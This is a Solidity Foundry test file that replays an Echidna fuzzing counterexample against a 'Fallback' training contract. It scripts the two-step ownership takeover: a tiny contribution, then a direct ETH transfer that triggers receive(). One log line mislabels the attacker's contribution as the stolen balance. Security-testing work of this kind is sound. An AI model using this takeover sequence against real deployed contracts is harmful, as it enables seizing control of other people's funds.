// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../echidna/FallbackEchidna.sol";

/**
 * @title FallbackEchidnaTest
 * @notice Verify Echidna findings manually
 * @dev Reproduces the attack sequence Echidna discovers
 */
contract FallbackEchidnaTest is Test {
    FallbackEchidna public echidna;
    address public attacker = address(0x1337);

    function setUp() public {
        echidna = new FallbackEchidna{value: 100 ether}();
        vm.deal(attacker, 100 ether);
    }

    function testPropertyHoldsInitially() public view {
        assertTrue(echidna.echidna_owner_never_changes());
        assertTrue(echidna.echidna_owner_has_1000eth());
        assertTrue(echidna.echidna_owner_not_zero());
        assertTrue(echidna.echidna_owner_has_contribution());
    }

    function testEchidnaCounterexample() public {
    console2.log("====================================");
    console2.log("Reproducing Echidna Counterexample");
    console2.log("====================================");
        console.log("");
        
        address originalOwner = echidna.owner();
        console.log("Original owner:", originalOwner);
        console.log("Attacker:      ", attacker);
        console.log("");
        
        // Property holds before attack
        assertTrue(echidna.echidna_owner_never_changes());
        
        vm.startPrank(attacker);
        
        // Step 1: contribute (from Echidna sequence)
        console.log("Step 1: contribute(0.0001 ETH)");
        echidna.contribute{value: 0.0001 ether}();
        console.log("  ✓ Contribution recorded");
        console.log("  Attacker contribution:", echidna.contributions(attacker));
        
        // Property still holds after contribution
        assertTrue(echidna.echidna_owner_never_changes());
        
        console.log("");
        console.log("Step 2: Send ETH to trigger receive()");
        
        // Step 2: Send ETH directly (triggers receive, like Echidna does)
        (bool success,) = address(echidna).call{value: 0.0001 ether}("");
        require(success, "ETH send failed");
        
        console.log("  ✓ receive() triggered");
        console.log("  New owner:", echidna.owner());
        
        vm.stopPrank();
        
        console.log("");
    console2.log("====================================");
    console2.log("Property status");
    console2.log("====================================");
    console2.log("  owner_never_changes:    ", echidna.echidna_owner_never_changes());
    console2.log("  owner_has_1000eth:      ", echidna.echidna_owner_has_1000eth());
    console2.log("  owner_not_zero:         ", echidna.echidna_owner_not_zero());
    console2.log("  owner_has_contribution: ", echidna.echidna_owner_has_contribution());
    console2.log("====================================");
        console.log("");
    console2.log("Attack cost: 0.0002 ETH");
    console2.log("Contract balance stolen: ", echidna.contributions(attacker));
        
        // Verify properties
        assertFalse(echidna.echidna_owner_never_changes(), "Owner should have changed");
        assertFalse(echidna.echidna_owner_has_1000eth(), "Owner doesn't have 1000 ETH");
        assertTrue(echidna.echidna_owner_not_zero(), "Owner should not be zero");
        assertTrue(echidna.echidna_owner_has_contribution(), "Owner should have contribution");
        
        assertEq(echidna.owner(), attacker, "Attacker should be owner");
    }

    function testReceiveFunctionDirectly() public {
        vm.startPrank(attacker);
        
        // First contribute
        echidna.contribute{value: 0.0001 ether}();
        
        // Verify we can trigger receive
        uint256 contractBalanceBefore = address(echidna).balance;
        
        // Send ETH directly - triggers receive()
        (bool success,) = address(echidna).call{value: 0.0001 ether}("");
        assertTrue(success);
        
        // Verify effects
        assertEq(echidna.owner(), attacker);
        assertEq(address(echidna).balance, contractBalanceBefore + 0.0001 ether);
        
        vm.stopPrank();
    }

    function testCannotTriggerReceiveWithoutContribution() public {
        vm.startPrank(attacker);
        
        // Try to trigger receive without contributing first
        vm.expectRevert();
        (bool success,) = address(echidna).call{value: 0.0001 ether}("");
        
        vm.stopPrank();
    }
}
